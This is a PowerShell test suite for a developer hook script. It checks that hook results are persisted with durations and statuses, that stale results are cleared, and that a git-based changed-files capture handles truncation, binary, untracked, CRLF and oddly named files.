$d234Json = if (Test-Path -LiteralPath $d234File) { Get-Content -Raw -LiteralPath $d234File | ConvertFrom-Json } else { $null }
Assert-Eq "19a: the file names the hook it belongs to" "before_doing" `
    "$(if ($d234Json) { $d234Json.hook } else { '' })"
Assert-Eq "19a: the persisted status is success" "success" `
    "$(if ($d234Json) { $d234Json.status } else { '' })"
# Asserting > 0 rather than a range keeps this off the wall clock.
$d234Ms = if ($d234Json) { [int]$d234Json.duration_ms } else { 0 }
if ($d234Ms -gt 0) {
    Write-Host "  PASS: 19a: the persisted duration_ms is a real measurement (${d234Ms}ms)" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 19a: persisted duration_ms must be > 0, got '$d234Ms'" -ForegroundColor Red
    $script:FAIL++
}
Assert-Contains "19a: stdout still carries the duration (contract unchanged)" `
    '"duration_ms":' $r19a.Stdout

# 19b: an EMPTY section writes nothing. This is plugin mode, it does no work,
# and 0 is the truthful answer — a missing file must mean "keep 0", never an
# error and never a licence to invent a figure.
$d234Empty = Join-Path $TmpDir 'g19-empty'
New-Item -ItemType Directory -Path $d234Empty -Force | Out-Null
Set-Content -Path (Join-Path $d234Empty '.stride.md') -Value @'
## before_doing
```bash
```
'@ -Encoding UTF8
$null = Invoke-HookScript -InputJson $d234Claim -Phase 'post' -ProjectDir $d234Empty
if (Test-Path -LiteralPath (Join-Path $d234Empty '.stride/.hook-result-before_doing.json')) {
    Write-Host "  FAIL: 19b: an empty section must not write a result file" -ForegroundColor Red
    $script:FAIL++
} else {
    Write-Host "  PASS: 19b: an empty section writes no result file (0 stays truthful)" -ForegroundColor Green
    $script:PASS++
}

# 19c: one hook's result never overwrites another's.
$d234Two = Join-Path $TmpDir 'g19-two-hooks'
New-Item -ItemType Directory -Path $d234Two -Force | Out-Null
Set-Content -Path (Join-Path $d234Two '.stride.md') -Value @'
## after_doing
```bash
echo after_doing_ran
```

## before_review
```bash
echo before_review_ran
```
'@ -Encoding UTF8
$null = Invoke-HookScript -InputJson $d234Complete -Phase 'pre' -ProjectDir $d234Two
$null = Invoke-HookScript -InputJson $d234Complete -Phase 'post' -ProjectDir $d234Two
$d234Ad = Join-Path $d234Two '.stride/.hook-result-after_doing.json'
$d234Br = Join-Path $d234Two '.stride/.hook-result-before_review.json'
Assert-Eq "19c: after_doing keeps its own result" "after_doing" `
    "$(if (Test-Path -LiteralPath $d234Ad) { (Get-Content -Raw -LiteralPath $d234Ad | ConvertFrom-Json).hook } else { '' })"
Assert-Eq "19c: before_review keeps its own result" "before_review" `
    "$(if (Test-Path -LiteralPath $d234Br) { (Get-Content -Raw -LiteralPath $d234Br | ConvertFrom-Json).hook } else { '' })"

# 19d: the failure path persists a duration too. Before D234 the .ps1 failure
# hashtable carried no duration at all, because $secDurationMs was not computed
# until after that branch had already written its JSON and returned.
$d234Fail = Join-Path $TmpDir 'g19-fail'
New-Item -ItemType Directory -Path $d234Fail -Force | Out-Null
Set-Content -Path (Join-Path $d234Fail '.stride.md') -Value @'
## after_doing
```bash
sleep 1
exit 7
```
'@ -Encoding UTF8
$null = Invoke-HookScript -InputJson $d234Complete -Phase 'pre' -ProjectDir $d234Fail
$d234Ff = Join-Path $d234Fail '.stride/.hook-result-after_doing.json'
$d234FJson = if (Test-Path -LiteralPath $d234Ff) { Get-Content -Raw -LiteralPath $d234Ff | ConvertFrom-Json } else { $null }
Assert-Eq "19d: the failure path persists its result too" "failed" `
    "$(if ($d234FJson) { $d234FJson.status } else { '' })"
$d234Fms = if ($d234FJson) { [int]$d234FJson.duration_ms } else { 0 }
if ($d234Fms -gt 0) {
    Write-Host "  PASS: 19d: a failed hook carries a real duration_ms (${d234Fms}ms)" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 19d: failed duration_ms must be > 0, got '$d234Fms'" -ForegroundColor Red
    $script:FAIL++
}

# 19e: a re-run REPLACES the same hook's result, and the replacement is fresh.
# Existence alone cannot tell "overwrote" from "silently left the previous file
# alone", so the section body changes between runs and the assertion reads it
# back out.
Set-Content -Path (Join-Path $d234Two '.stride.md') -Value @'
## after_doing
```bash
echo after_doing_RERUN
```
'@ -Encoding UTF8
$null = Invoke-HookScript -InputJson $d234Complete -Phase 'pre' -ProjectDir $d234Two
$d234Re = if (Test-Path -LiteralPath $d234Ad) { Get-Content -Raw -LiteralPath $d234Ad | ConvertFrom-Json } else { $null }
Assert-Eq "19e: the replacement carries the SECOND run's data, not the first's" `
    "echo after_doing_RERUN" `
    "$(if ($d234Re) { @($d234Re.commands_completed)[0] } else { '' })"

# 19f: a claim clears the previous task's result files. They carry no task id,
# and the reader rule covers only ABSENCE, so a leftover would be read as this
# task's figure — reachable by swapping .stride.md to plugin mode.
$d234Clear = Join-Path $TmpDir 'g19-claim-clear'
New-Item -ItemType Directory -Path (Join-Path $d234Clear '.stride') -Force | Out-Null
Set-Content -Path (Join-Path $d234Clear '.stride/.hook-result-after_doing.json') `
    -Value '{"hook":"after_doing","status":"success","duration_ms":999999}' -Encoding UTF8
Set-Content -Path (Join-Path $d234Clear '.stride.md') -Value @'
## before_doing
```bash
```
'@ -Encoding UTF8
$null = Invoke-HookScript -InputJson $d234Claim -Phase 'post' -ProjectDir $d234Clear
if (Test-Path -LiteralPath (Join-Path $d234Clear '.stride/.hook-result-after_doing.json')) {
    Write-Host "  FAIL: 19f: a claim must clear the previous task's hook results" -ForegroundColor Red
    $script:FAIL++
} else {
    Write-Host "  PASS: 19f: a claim clears the previous task's hook results (no stale figure)" -ForegroundColor Green
    $script:PASS++
}

# 19g: Write-HookResult must stay NON-FATAL when it cannot create .stride/.
# This is the regression test for the StrictMode defect found by hand: with
# $_tmp unset, the catch block's own guard threw "The variable '$_tmp' cannot be
# retrieved because it has not been set", propagating out of the function on
# exactly the path the catch exists to absorb. The hook must still succeed.
$d234RO = Join-Path $TmpDir 'g19-readonly'
New-Item -ItemType Directory -Path $d234RO -Force | Out-Null
Set-Content -Path (Join-Path $d234RO '.stride.md') -Value @'
## before_doing
```bash
echo ran_anyway
```
'@ -Encoding UTF8
# Block creation of .stride/ by making the project dir read-only to its owner.
if ($IsLinux -or $IsMacOS) {
    & chmod 500 $d234RO
    $r19g = Invoke-HookScript -InputJson $d234Claim -Phase 'post' -ProjectDir $d234RO
    & chmod 700 $d234RO
    Assert-Eq "19g: an unwritable .stride/ does not fail the hook (never-fatal)" `
        "0" "$($r19g.ExitCode)"
    Assert-NotContains "19g: the StrictMode unset-variable defect has not returned" `
        "cannot be retrieved because it has not been set" ($r19g.Stdout + $r19g.Stderr)
} else {
    Write-Host "  SKIP: 19g: unwritable-directory case needs POSIX permissions" -ForegroundColor Yellow
}

# ============================================================
# Test Group 21: W2100 — the changed-files CAPTURE engine
# ============================================================
# Counterparts to the bash suite's Test Group 7, which pins the per-file diff
# contract (G148/W719). Before W2100 this side had no capture to test: the hook
# only uploaded a snapshot something else had written, which on native Windows
# was nobody.
#
# The bash suite `source`s the hook and calls capture_changed_files directly.
# That is impossible here — stride-hook.ps1 ends its argument handling with
# `exit 0`, and `exit` in a dot-sourced script kills the calling process — so
# the git-backed cases run end to end through Invoke-HookScript, and the two
# pure-logic cases (truncation, binary detection) run against test-local
# mirrors exactly as the bash suite does with trunc_diff_inline and
# is_binary_in_numstat. 21x then binds those mirrors to the real implementation
# with a genuine >500-line diff, which the bash suite never does.
Write-Host ""
Write-Host "=== Test Group 21: W2100 changed-files capture engine ==="

if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Host "  SKIP: Test Group 21 requires git" -ForegroundColor Yellow
} else {

# Mirror of the implementation's truncation, for the pure-logic cases.
function Get-TruncatedDiffMirror {
    param([string]$Text)
    $maxLines = 500
    $marker = '[diff truncated at 500 lines]'
    $lineCount = 0
    if ($Text) { $lineCount = ([regex]::Matches($Text, "`n")).Count + 1 }
    if ($lineCount -le $maxLines) { return $Text }
    $parts = $Text.Split("`n")
    return (($parts[0..($maxLines - 2)]) -join "`n") + "`n" + $marker
}

$g21Marker = '[diff truncated at 500 lines]'
$g21BinPlaceholder = '[binary file ' + [char]0x2014 + ' no diff captured]'

# --- 21a-21c: truncation (mirrors sh 7a-7c) ---
$t500 = (1..500 | ForEach-Object { "line $_" }) -join "`n"
$r21a = Get-TruncatedDiffMirror -Text $t500
Assert-Eq "21a: a 500-line diff is NOT truncated" "500" "$((([regex]::Matches($r21a, "`n")).Count + 1))"
Assert-NotContains "21a: no marker on an exactly-500-line diff" $g21Marker $r21a

$t750 = (1..750 | ForEach-Object { "line $_" }) -join "`n"
$r21b = Get-TruncatedDiffMirror -Text $t750
Assert-Eq "21b: a 750-line diff truncates to exactly 500 lines" "500" "$((([regex]::Matches($r21b, "`n")).Count + 1))"
Assert-Contains "21b: the truncation marker is present" $g21Marker $r21b
Assert-Eq "21b: the marker is the FINAL line" $g21Marker ($r21b.Split("`n")[-1])

Assert-Eq "21c: empty input stays empty" "" (Get-TruncatedDiffMirror -Text '')

# --- 21d-21f: binary detection from numstat (mirrors sh 7d-7f) ---
$nzBin = "-`t-`tassets/logo.png" + [char]0 + "3`t1`tlib/foo.ex" + [char]0
$binSet21 = & {
    $set = @{}
    $fields = @($nzBin.Split([char]0))
    foreach ($rec in $fields) {
        if (-not $rec) { continue }
        $p = $rec.Split([char]9)
        if ($p.Count -lt 3) { continue }
        if ($p[0] -eq '-' -and $p[1] -eq '-') { $set[$p[2]] = $true }
    }
    $set
}
Assert-Eq "21d: a binary numstat record is detected" "True" "$($binSet21.ContainsKey('assets/logo.png'))"
Assert-Eq "21e: a text numstat record is not flagged binary" "False" "$($binSet21.ContainsKey('lib/foo.ex'))"
Assert-Eq "21f: a path absent from numstat is not flagged binary" "False" "$($binSet21.ContainsKey('nope.txt'))"

# --- shared fixture helpers for the e2e cases ---
function New-CaptureRepo {
    param([string]$Name)
    $dir = Join-Path $TmpDir $Name
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    & git -C $dir init -q 2>$null | Out-Null
    & git -C $dir config user.email 'test@test.local' 2>$null | Out-Null
    & git -C $dir config user.name 'Test' 2>$null | Out-Null
    & git -C $dir config commit.gpgsign false 2>$null | Out-Null
    # Root-anchored (leading /) on purpose: an unanchored pattern matches at any
    # depth, which would gitignore sub/.stride-changed-files.json and make 21v —
    # the case proving a same-named SUBDIRECTORY file is kept — pass vacuously
    # by never presenting the file at all.
    Set-Content -Path (Join-Path $dir '.gitignore') `
        -Value "/.stride.md`n/.stride-env-cache`n/.stride-changed-files.json`n/.stride-diff-upload-state`n/.stride-dirty-baseline" -Encoding UTF8
    Set-Content -Path (Join-Path $dir 'seed.txt') -Value 'seed' -Encoding UTF8
    & git -C $dir add .gitignore seed.txt 2>$null | Out-Null
    & git -C $dir commit -q -m 'seed' 2>$null | Out-Null
    Set-Content -Path (Join-Path $dir '.stride.md') -Value @'
## after_doing
```bash
echo "ran"
```
'@ -Encoding UTF8
    return $dir
}

function Set-CaptureBase {
    param([string]$Dir, [string]$TaskId = '42', [string]$BaseRef = '')
    $lines = "TASK_ID=$TaskId"
    if ($BaseRef) { $lines = $lines + "`nTASK_BASE_REF=$BaseRef" }
    Set-Content -Path (Join-Path $Dir '.stride-env-cache') -Value $lines -Encoding UTF8
}

# Port 1 refuses instantly, so the PUT always fails fast and only the ON-DISK
# snapshot is under test.
function Invoke-CaptureRun {
    param([string]$Dir, [string]$TaskId = '42')
    $json = @{ tool_input = @{ command = "curl -X PATCH http://127.0.0.1:1/api/tasks/$TaskId/complete -H `"Authorization: Bearer tok`"" } } | ConvertTo-Json -Compress
    return (Invoke-HookScript -InputJson $json -Phase 'pre' -ProjectDir $Dir)
}

function Get-CaptureEntries {
    param([string]$Dir)
    $p = Join-Path $Dir '.stride-changed-files.json'
    if (-not (Test-Path $p)) { return $null }
    $raw = Get-Content -Raw -Path $p
    if (-not $raw) { return @() }
    return @($raw | ConvertFrom-Json)
}

# --- 21g: tracked modify + binary + delete (mirrors sh 7g) ---
$g21g = New-CaptureRepo -Name 'g21-mixed'
Set-Content -Path (Join-Path $g21g 'a.txt') -Value 'original' -Encoding UTF8
Set-Content -Path (Join-Path $g21g 'b.txt') -Value 'doomed' -Encoding UTF8
[System.IO.File]::WriteAllBytes((Join-Path $g21g 'logo.png'), ([byte[]](0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,0x00,0x01,0x02,0x03)))
& git -C $g21g add . 2>$null | Out-Null
& git -C $g21g commit -q -m 'base' 2>$null | Out-Null
$g21gBase = (& git -C $g21g rev-parse HEAD | Out-String).Trim()
Set-Content -Path (Join-Path $g21g 'a.txt') -Value "original`nmodified" -Encoding UTF8
[System.IO.File]::WriteAllBytes((Join-Path $g21g 'logo.png'), ([byte[]](0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,0xFF,0xFE,0xFD,0xFC)))
Remove-Item -Force (Join-Path $g21g 'b.txt')
Set-CaptureBase -Dir $g21g -BaseRef $g21gBase
$null = Invoke-CaptureRun -Dir $g21g
$e21g = Get-CaptureEntries -Dir $g21g
Assert-Eq "21g: three changed files are captured" "3" "$(@($e21g).Count)"
$a21g = @($e21g | Where-Object { $_.path -eq 'a.txt' })
Assert-Eq "21g: the modified text file is present" "1" "$($a21g.Count)"
if ($a21g.Count -eq 1) {
    Assert-Contains "21g: its diff carries the git header" "diff --git a/a.txt" $a21g[0].diff
    Assert-Contains "21g: its diff carries the added line" "+modified" $a21g[0].diff
}
$p21g = @($e21g | Where-Object { $_.path -eq 'logo.png' })
Assert-Eq "21g: the binary file is present" "1" "$($p21g.Count)"
if ($p21g.Count -eq 1) {
    Assert-Eq "21g: the binary file gets the placeholder, em dash and all" $g21BinPlaceholder $p21g[0].diff
}
Assert-Eq "21g: the deleted file is present" "1" "$(@($e21g | Where-Object { $_.path -eq 'b.txt' }).Count)"

# --- 21h: non-git project yields a well-formed [] file, not an absent one (sh 7h) ---
$g21h = Join-Path $TmpDir 'g21-nongit'
New-Item -ItemType Directory -Path $g21h -Force | Out-Null
Set-Content -Path (Join-Path $g21h '.stride.md') -Value @'
## after_doing
```bash
echo "ran"
```
'@ -Encoding UTF8
Set-CaptureBase -Dir $g21h
$null = Invoke-CaptureRun -Dir $g21h
$snap21h = Join-Path $g21h '.stride-changed-files.json'
Assert-Eq "21h: a non-git project still writes a snapshot file" "True" "$(Test-Path $snap21h)"
if (Test-Path $snap21h) {
    Assert-Eq "21h: and its content is a well-formed empty array" "[]" ((Get-Content -Raw -Path $snap21h).Trim())
}

# --- 21i: no TASK_BASE_REF falls back to HEAD~1 (sh 7i) ---
$g21i = New-CaptureRepo -Name 'g21-fallback'
Set-Content -Path (Join-Path $g21i 'c.txt') -Value 'first' -Encoding UTF8
& git -C $g21i add c.txt 2>$null | Out-Null
& git -C $g21i commit -q -m 'c1' 2>$null | Out-Null
Set-CaptureBase -Dir $g21i
$null = Invoke-CaptureRun -Dir $g21i
$e21i = Get-CaptureEntries -Dir $g21i
Assert-Eq "21i: the HEAD~1 fallback captures the last commit's file" "1" "$(@($e21i | Where-Object { $_.path -eq 'c.txt' }).Count)"

# --- 21j: a single-quoted TASK_BASE_REF is unquoted before use (sh 7j) ---
$g21j = New-CaptureRepo -Name 'g21-quoted'
$g21jBase = (& git -C $g21j rev-parse HEAD | Out-String).Trim()
Set-Content -Path (Join-Path $g21j 'tracked.txt') -Value 'changed' -Encoding UTF8
& git -C $g21j add tracked.txt 2>$null | Out-Null
& git -C $g21j commit -q -m 'work' 2>$null | Out-Null
Set-Content -Path (Join-Path $g21j '.stride-env-cache') -Value "TASK_ID=42`nTASK_BASE_REF='$g21jBase'" -Encoding UTF8
$null = Invoke-CaptureRun -Dir $g21j
$e21j = Get-CaptureEntries -Dir $g21j
Assert-Eq "21j: a quoted base ref still resolves" "1" "$(@($e21j | Where-Object { $_.path -eq 'tracked.txt' }).Count)"

# --- 21k: a section whose commands are all comments still captures (sh 7k) ---
$g21k = New-CaptureRepo -Name 'g21-comments'
$g21kBase = (& git -C $g21k rev-parse HEAD | Out-String).Trim()
Set-Content -Path (Join-Path $g21k '.stride.md') -Value @'
## after_doing
```bash
# only a comment
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $g21k 'seed.txt') -Value 'edited' -Encoding UTF8
Set-CaptureBase -Dir $g21k -BaseRef $g21kBase
$null = Invoke-CaptureRun -Dir $g21k
Assert-Eq "21k: capture runs even when the section body is all comments" "1" `
    "$(@((Get-CaptureEntries -Dir $g21k) | Where-Object { $_.path -eq 'seed.txt' }).Count)"

# --- 21l: before_review leaves an EXISTING snapshot byte-for-byte alone (sh 7l) ---
$g21l = New-CaptureRepo -Name 'g21-selfheal-existing'
$g21lSnap = Join-Path $g21l '.stride-changed-files.json'
Set-Content -Path $g21lSnap -Value '[{"path":"stale.txt","diff":"stale body"}]' -Encoding UTF8 -NoNewline
$g21lBefore = Get-Content -Raw -Path $g21lSnap
Set-CaptureBase -Dir $g21l
$g21lJson = @{ tool_input = @{ command = "curl -X PATCH http://127.0.0.1:1/api/tasks/42/complete -H `"Authorization: Bearer tok`"" } } | ConvertTo-Json -Compress
$null = Invoke-HookScript -InputJson $g21lJson -Phase 'post' -ProjectDir $g21l
Assert-Eq "21l: the self-heal never re-captures over an existing snapshot" $g21lBefore (Get-Content -Raw -Path $g21lSnap)

# --- 21m: base resolves but nothing differs (sh 7m) ---
$g21m = New-CaptureRepo -Name 'g21-nochange'
Set-CaptureBase -Dir $g21m -BaseRef (& git -C $g21m rev-parse HEAD | Out-String).Trim()
$null = Invoke-CaptureRun -Dir $g21m
Assert-Eq "21m: an empty change set is [] " "[]" ((Get-Content -Raw -Path (Join-Path $g21m '.stride-changed-files.json')).Trim())

# --- 21n: a tracked file containing NULs is treated as binary (sh 7n) ---
$g21n = New-CaptureRepo -Name 'g21-trackedbin'
$g21nBase = (& git -C $g21n rev-parse HEAD | Out-String).Trim()
[System.IO.File]::WriteAllBytes((Join-Path $g21n 'seed.txt'), ([byte[]](0x00,0x01,0x02,0x00,0x03)))
Set-CaptureBase -Dir $g21n -BaseRef $g21nBase
$null = Invoke-CaptureRun -Dir $g21n
$e21n = @((Get-CaptureEntries -Dir $g21n) | Where-Object { $_.path -eq 'seed.txt' })
Assert-Eq "21n: a tracked file rewritten with NULs is captured" "1" "$($e21n.Count)"
if ($e21n.Count -eq 1) { Assert-Eq "21n: and gets the binary placeholder" $g21BinPlaceholder $e21n[0].diff }

# --- 21o/21p: unstaged and staged-but-uncommitted (sh 7o/7p) ---
$g21o = New-CaptureRepo -Name 'g21-unstaged'
$g21oBase = (& git -C $g21o rev-parse HEAD | Out-String).Trim()
Set-Content -Path (Join-Path $g21o 'seed.txt') -Value "seed`nunstaged edit" -Encoding UTF8
Set-CaptureBase -Dir $g21o -BaseRef $g21oBase
$null = Invoke-CaptureRun -Dir $g21o
$e21o = @((Get-CaptureEntries -Dir $g21o) | Where-Object { $_.path -eq 'seed.txt' })
Assert-Eq "21o: an unstaged modification is captured" "1" "$($e21o.Count)"
if ($e21o.Count -eq 1) { Assert-Contains "21o: with its body" "+unstaged edit" $e21o[0].diff }

$g21p = New-CaptureRepo -Name 'g21-staged'
$g21pBase = (& git -C $g21p rev-parse HEAD | Out-String).Trim()
Set-Content -Path (Join-Path $g21p 'seed.txt') -Value "seed`nstaged edit" -Encoding UTF8
& git -C $g21p add seed.txt 2>$null | Out-Null
Set-CaptureBase -Dir $g21p -BaseRef $g21pBase
$null = Invoke-CaptureRun -Dir $g21p
$e21p = @((Get-CaptureEntries -Dir $g21p) | Where-Object { $_.path -eq 'seed.txt' })
Assert-Eq "21p: a staged-but-uncommitted modification is captured" "1" "$($e21p.Count)"
if ($e21p.Count -eq 1) { Assert-Contains "21p: with its body" "+staged edit" $e21p[0].diff }

# --- 21q/21r: untracked new files (sh 7q/7r) ---
$g21q = New-CaptureRepo -Name 'g21-untracked'
Set-CaptureBase -Dir $g21q -BaseRef (& git -C $g21q rev-parse HEAD | Out-String).Trim()
Set-Content -Path (Join-Path $g21q 'new_file.txt') -Value "line one" -Encoding UTF8
$null = Invoke-CaptureRun -Dir $g21q
$r21q = Invoke-CaptureRun -Dir $g21q
# A healthy capture must be SILENT about drops. The drop notice is the only
# signal a real omission has, so one that also fires on ordinary runs is worse
# than none — and that is exactly what happened: Out-String's trailing newline
# survived the NUL split as a phantom entry and tripped the control-character
# rule on every repo with an untracked file. This assertion is what makes that
# regression visible instead of ambient.
Assert-NotContains "21q: a clean capture emits no drop notice" `
    "dropped an unsafe snapshot path" ($r21q.Stdout + $r21q.Stderr)
$e21q = @((Get-CaptureEntries -Dir $g21q) | Where-Object { $_.path -eq 'new_file.txt' })
Assert-Eq "21q: an untracked new file is captured" "1" "$($e21q.Count)"
if ($e21q.Count -eq 1) {
    Assert-Contains "21q: its diff names the new file" "+++ b/new_file.txt" $e21q[0].diff
    Assert-Contains "21q: and carries its content" "+line one" $e21q[0].diff
}

$g21r = New-CaptureRepo -Name 'g21-untrackedbin'
Set-CaptureBase -Dir $g21r -BaseRef (& git -C $g21r rev-parse HEAD | Out-String).Trim()
[System.IO.File]::WriteAllBytes((Join-Path $g21r 'blob.bin'), ([byte[]](0x00,0xFF,0x00,0xFE)))
$null = Invoke-CaptureRun -Dir $g21r
$e21r = @((Get-CaptureEntries -Dir $g21r) | Where-Object { $_.path -eq 'blob.bin' })
Assert-Eq "21r: an untracked binary file is captured" "1" "$($e21r.Count)"
if ($e21r.Count -eq 1) { Assert-Eq "21r: and gets the binary placeholder" $g21BinPlaceholder $e21r[0].diff }

# --- 21s: committed since base, then modified again (sh 7s) ---
$g21s = New-CaptureRepo -Name 'g21-commit-then-edit'
$g21sBase = (& git -C $g21s rev-parse HEAD | Out-String).Trim()
Set-Content -Path (Join-Path $g21s 'seed.txt') -Value "seed`ncommitted" -Encoding UTF8
& git -C $g21s add seed.txt 2>$null | Out-Null
& git -C $g21s commit -q -m 'mid' 2>$null | Out-Null
Set-Content -Path (Join-Path $g21s 'seed.txt') -Value "seed`ncommitted`nthen edited" -Encoding UTF8
Set-CaptureBase -Dir $g21s -BaseRef $g21sBase
$null = Invoke-CaptureRun -Dir $g21s
$e21s = @((Get-CaptureEntries -Dir $g21s) | Where-Object { $_.path -eq 'seed.txt' })
Assert-Eq "21s: a file committed then re-edited appears exactly once" "1" "$($e21s.Count)"
if ($e21s.Count -eq 1) { Assert-Contains "21s: and its diff reaches the working-tree content" "+then edited" $e21s[0].diff }

# --- 21t/21u/21v/21w: the hook's own artifacts (sh 7t-7w) ---
$g21t = New-CaptureRepo -Name 'g21-artifacts'
Set-CaptureBase -Dir $g21t -BaseRef (& git -C $g21t rev-parse HEAD | Out-String).Trim()
New-Item -ItemType Directory -Path (Join-Path $g21t 'sub') -Force | Out-Null
Set-Content -Path (Join-Path $g21t 'real.txt') -Value 'kept' -Encoding UTF8
Set-Content -Path (Join-Path $g21t 'sub/.stride-diff-upload-state') -Value 'user file' -Encoding UTF8
Set-Content -Path (Join-Path $g21t 'sub/.stride-changed-files.json') -Value 'user file' -Encoding UTF8
$null = Invoke-CaptureRun -Dir $g21t
$p21t = @((Get-CaptureEntries -Dir $g21t) | ForEach-Object { $_.path })
Assert-Eq "21t: a real change survives alongside the artifacts" "True" "$($p21t -contains 'real.txt')"
Assert-Eq "21t: the root upload-state artifact is excluded" "False" "$($p21t -contains '.stride-diff-upload-state')"
Assert-Eq "21t: the root snapshot artifact is excluded" "False" "$($p21t -contains '.stride-changed-files.json')"
Assert-Eq "21v: a same-named file in a SUBDIRECTORY is kept" "True" "$($p21t -contains 'sub/.stride-diff-upload-state')"
Assert-Eq "21v: and so is the subdirectory snapshot name" "True" "$($p21t -contains 'sub/.stride-changed-files.json')"

$g21u = New-CaptureRepo -Name 'g21-artifacts-committed'
Set-Content -Path (Join-Path $g21u '.gitignore') -Value ".stride.md`n.stride-env-cache" -Encoding UTF8
Set-Content -Path (Join-Path $g21u '.stride-diff-upload-state') -Value 'v1' -Encoding UTF8
Set-Content -Path (Join-Path $g21u '.stride-changed-files.json') -Value '[]' -Encoding UTF8
& git -C $g21u add .gitignore .stride-diff-upload-state .stride-changed-files.json 2>$null | Out-Null
& git -C $g21u commit -q -m 'commit artifacts' 2>$null | Out-Null
$g21uBase = (& git -C $g21u rev-parse HEAD | Out-String).Trim()
Set-Content -Path (Join-Path $g21u '.stride-diff-upload-state') -Value 'v2' -Encoding UTF8
Set-Content -Path (Join-Path $g21u 'real.txt') -Value 'kept' -Encoding UTF8
Set-CaptureBase -Dir $g21u -BaseRef $g21uBase
$null = Invoke-CaptureRun -Dir $g21u
$p21u = @((Get-CaptureEntries -Dir $g21u) | ForEach-Object { $_.path })
Assert-Eq "21u: a COMMITTED and modified artifact is still excluded" "False" "$($p21u -contains '.stride-diff-upload-state')"
Assert-Eq "21u: the real change beside it survives" "True" "$($p21u -contains 'real.txt')"

$g21w = New-CaptureRepo -Name 'g21-artifacts-only'
Set-CaptureBase -Dir $g21w -BaseRef (& git -C $g21w rev-parse HEAD | Out-String).Trim()
Set-Content -Path (Join-Path $g21w '.stride-diff-upload-state') -Value 'state' -Encoding UTF8
$null = Invoke-CaptureRun -Dir $g21w
Assert-Eq "21w: an artifacts-only working tree yields []" "[]" `
    ((Get-Content -Raw -Path (Join-Path $g21w '.stride-changed-files.json')).Trim())

# --- 21x: e2e truncation, binding 21a/21b's mirrors to the real code ---
$g21x = New-CaptureRepo -Name 'g21-truncate'
$g21xBase = (& git -C $g21x rev-parse HEAD | Out-String).Trim()
Set-Content -Path (Join-Path $g21x 'big.txt') -Value (((1..900) | ForEach-Object { "line $_" }) -join "`n") -Encoding UTF8
Set-CaptureBase -Dir $g21x -BaseRef $g21xBase
$null = Invoke-CaptureRun -Dir $g21x
$e21x = @((Get-CaptureEntries -Dir $g21x) | Where-Object { $_.path -eq 'big.txt' })
Assert-Eq "21x: a real >500-line diff is captured" "1" "$($e21x.Count)"
if ($e21x.Count -eq 1) {
    Assert-Eq "21x: the captured diff is exactly 500 lines" "500" "$((([regex]::Matches($e21x[0].diff, "`n")).Count + 1))"
    Assert-Eq "21x: and the marker is its final line" $g21Marker ($e21x[0].diff.Split("`n")[-1])
}

# --- 21y: CRLF content survives capture (the --output path) ---
$g21y = New-CaptureRepo -Name 'g21-crlf'
# Pin the line-ending policy in the FIXTURE. A machine with core.autocrlf=input
# (common, and the case here) strips the CR before a diff exists, so without
# this the assertion would silently test the contributor's git config rather
# than the capture — passing or failing for reasons that have nothing to do
# with this code.
& git -C $g21y config core.autocrlf false 2>$null | Out-Null
Set-Content -Path (Join-Path $g21y '.gitattributes') -Value "* -text`n" -Encoding UTF8
& git -C $g21y add .gitattributes 2>$null | Out-Null
& git -C $g21y commit -q -m 'pin eol' 2>$null | Out-Null
$g21yBase = (& git -C $g21y rev-parse HEAD | Out-String).Trim()
[System.IO.File]::WriteAllText((Join-Path $g21y 'seed.txt'), "seed`r`ncrlf line`r`n", (New-Object System.Text.UTF8Encoding($false)))
Set-CaptureBase -Dir $g21y -BaseRef $g21yBase
$null = Invoke-CaptureRun -Dir $g21y
$e21y = @((Get-CaptureEntries -Dir $g21y) | Where-Object { $_.path -eq 'seed.txt' })
Assert-Eq "21y: a CRLF file is captured" "1" "$($e21y.Count)"
if ($e21y.Count -eq 1) {
    Assert-Contains "21y: the CR survives into the snapshot body" "crlf line`r" $e21y[0].diff
}

# --- 21z: a path containing spaces is emitted verbatim with forward slashes ---
$g21z = New-CaptureRepo -Name 'g21-spaces'
Set-CaptureBase -Dir $g21z -BaseRef (& git -C $g21z rev-parse HEAD | Out-String).Trim()
New-Item -ItemType Directory -Path (Join-Path $g21z 'dir with space') -Force | Out-Null
Set-Content -Path (Join-Path $g21z 'dir with space/file name.txt') -Value 'spaced' -Encoding UTF8
$null = Invoke-CaptureRun -Dir $g21z
$p21z = @((Get-CaptureEntries -Dir $g21z) | ForEach-Object { $_.path })
Assert-Eq "21z: a path with spaces is emitted exactly, forward-slashed" "True" "$($p21z -contains 'dir with space/file name.txt')"

# --- 21aa: a RENAMED binary still gets the placeholder (bash's numstat cannot) ---
$g21aa = New-CaptureRepo -Name 'g21-rename'
[System.IO.File]::WriteAllBytes((Join-Path $g21aa 'old.bin'), ([byte[]](0x00,0x11,0x22,0x33,0x00,0x44)))
& git -C $g21aa add old.bin 2>$null | Out-Null
& git -C $g21aa commit -q -m 'add bin' 2>$null | Out-Null
$g21aaBase = (& git -C $g21aa rev-parse HEAD | Out-String).Trim()
& git -C $g21aa mv old.bin new.bin 2>$null | Out-Null
Set-CaptureBase -Dir $g21aa -BaseRef $g21aaBase
$null = Invoke-CaptureRun -Dir $g21aa
$e21aa = @((Get-CaptureEntries -Dir $g21aa) | Where-Object { $_.path -eq 'new.bin' })
Assert-Eq "21aa: the rename destination is captured" "1" "$($e21aa.Count)"
if ($e21aa.Count -eq 1) {
    Assert-Eq "21aa: a RENAMED binary still gets the placeholder" $g21BinPlaceholder $e21aa[0].diff
}

# --- 21bb: the snapshot is written WITHOUT a UTF-8 BOM ---
$g21bb = New-CaptureRepo -Name 'g21-bom'
Set-CaptureBase -Dir $g21bb -BaseRef (& git -C $g21bb rev-parse HEAD | Out-String).Trim()
Set-Content -Path (Join-Path $g21bb 'x.txt') -Value 'x' -Encoding UTF8
$null = Invoke-CaptureRun -Dir $g21bb
$b21bb = [System.IO.File]::ReadAllBytes((Join-Path $g21bb '.stride-changed-files.json'))
Assert-Eq "21bb: the snapshot has no UTF-8 BOM (it is base64'd verbatim onto the wire)" "False" `
    "$($b21bb.Length -ge 3 -and $b21bb[0] -eq 0xEF -and $b21bb[1] -eq 0xBB -and $b21bb[2] -eq 0xBF)"

